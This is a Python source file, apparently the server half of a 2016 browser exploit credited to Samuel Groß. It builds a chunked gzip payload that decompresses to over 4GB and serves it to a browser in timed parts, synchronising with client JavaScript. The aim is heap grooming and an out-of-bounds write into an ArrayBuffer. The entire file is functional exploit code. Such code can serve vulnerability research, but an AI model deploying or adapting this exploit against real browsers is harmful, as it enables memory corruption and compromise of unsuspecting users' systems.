#!/usr/bin/env python3
#
# Implements the server-side logic of the exloit.
#
# Copyright (c) 2016 Samuel Groß
#

import asyncio
import zlib
import os.path

from server import *

HOST = '127.0.0.1'
HOST = '0.0.0.0'
PORT = 8000
LOOP = asyncio.get_event_loop()

server_done_event = asyncio.Event(loop=LOOP)
script_ready_event = asyncio.Event(loop=LOOP)


KB = 1024
MB = 1024 * KB
GB = 1024 * MB

# Created by construct_payload()
payload_parts = []

def construct_payload():
    """Generates the compressed payload.

    This function generates multiple parts of the payload. Concatenating these parts and decompressing
    the result will yield a 4GB + len(overflow_data) chunk.
    The parts are generated such that sending one chunk will trigger a realloc() in the browser.
    The last part contains the final byte of the 4GB chunk and the overflow_data.
    """
    compressor = zlib.compressobj(level=1, wbits=31)         # include gzip header + trailer
    parts = []

    def add_part(size):
        payload = bytearray()
        payload += compressor.compress(bytearray(size))
        payload += compressor.flush(zlib.Z_FULL_FLUSH)
        parts.append(payload)
        return size

    # Send (total sizes): 1 MB + 1, 2 MB + 1, 4 MB + 1, ... which are the realloc boundaries.
    # After every realloc, JavaScript will try to fill the now free chunk.
    # Do this until we've send 0xffffffff bytes of data, then build the final chunk.
    total_size = 512 * KB      # Start with 1MB (+ 1), browser stores data as char16_t
    cur_size = 0
    final_size = 0xffffffff
    while cur_size < final_size:
        cur_size += add_part(total_size + 1 - cur_size)
        total_size = min(2 * total_size, final_size - 1)

    # UTF-8 for 0xa0, which is the offset of the inline data of the first ArrayBuffer in an arena. See code.js
    overflow_data = b'\xc2\xa0' * 2

    payload = bytearray()
    payload += compressor.compress(b'\x00' + overflow_data)
    payload += compressor.flush()
    parts.append(payload)

    return parts


async def serve_payload_js(request, response):
    # (Optional) wait a short while for the browser to finish initialization
    await asyncio.sleep(2.5)

    payload_len = sum(map(len, payload_parts))

    print("Total size of compressed payload: {} bytes".format(payload_len))

    assert('gzip' in request.headers.get('Accept-Encoding', ''))
    response.send_header(200, {
        'Content-Type': 'application/javascript; charset=utf-8',
        'Content-Length': str(payload_len),
        'Content-Encoding': 'gzip'
    })

    for i, part in enumerate(payload_parts[:-1]):
        print("Waiting for JavaScript...")
        await script_ready_event.wait()
        script_ready_event.clear()

        response.write(part)
        await response.drain()

        # Give the browser some time to decompress (more or less arbitrary delays)
        # Could try to improve this by measuring CPU usage in JavaScript or something like that...
        print("Payload sent, waiting a short while...")
        await asyncio.sleep(0.5)
        if i > 10:
            await asyncio.sleep(2)

        # Browser will (hopefully) have realloc'ed the current chunk by now. Let JavaScript
        # take the freed chunk now.
        print("Waiting for JavaScript...")
        server_done_event.set()

    # Wait for JavaScript to allocate something to overflow into
    await script_ready_event.wait()
    script_ready_event.clear()

    # Trigger the overflow
    print("Sending remaining payload data...")
    response.write(payload_parts[-1])
    await response.drain()
    await asyncio.sleep(0.1)

    server_done_event.set()

async def sync(request, response):
    script_ready_event.set()
    await server_done_event.wait()
    server_done_event.clear()

    response.send_header(200, {
        'Content-Type': 'text/plain; charset=utf-8',
        'Content-Length': '2'
    })

    response.write(b'OK')
    await response.drain()

ROUTES = {
    '/': serve_file('index.html', 'text/html; charset=utf-8'),
    '/payload.js': serve_payload_js,
    '/code.js': serve_file('code.js', 'application/javascript; charset=utf-8'),
    '/sync': sync,
}

#
# Main
#

def main():
    print("Constructing payload...")
    global payload_parts
    payload_parts = construct_payload()

    server = HTTPServer(HOST, PORT, ROUTES, LOOP)
    server.run_forever()

if __name__ == '__main__':
    main()
